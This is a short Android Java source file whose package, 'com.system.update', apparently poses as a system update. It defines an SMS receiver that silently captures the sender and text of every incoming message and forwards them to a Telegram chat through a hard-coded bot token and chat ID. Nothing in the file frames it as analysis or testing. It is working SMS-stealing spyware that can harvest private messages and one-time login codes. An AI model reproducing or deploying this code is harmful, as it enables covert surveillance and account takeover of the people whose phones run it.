package com.system.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.io.IOException;
import okhttp3.*;

public class SmsReceiver extends BroadcastReceiver {
    private static final String BOT_TOKEN = "9014559285:AAEamXnqANi68FHT7mnT3DpF5hC1y9zmes4";
    private static final String CHAT_ID = "6978974735";
    private final OkHttpClient client = new OkHttpClient();

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    StringBuilder msg = new StringBuilder("🚨 New SMS:\n");
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        msg.append("From: ").append(sms.getOriginatingAddress()).append("\n").append(sms.getMessageBody()).append("\n");
                    }
                    RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", msg.toString()).build();
                    Request request = new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").post(body).build();
                    client.newCall(request).enqueue(new Callback() {
                        @Override public void onFailure(Call call, IOException e) { }
                        @Override public void onResponse(Call call, Response response) { }
                    });
                }
            }
        }
    }
}
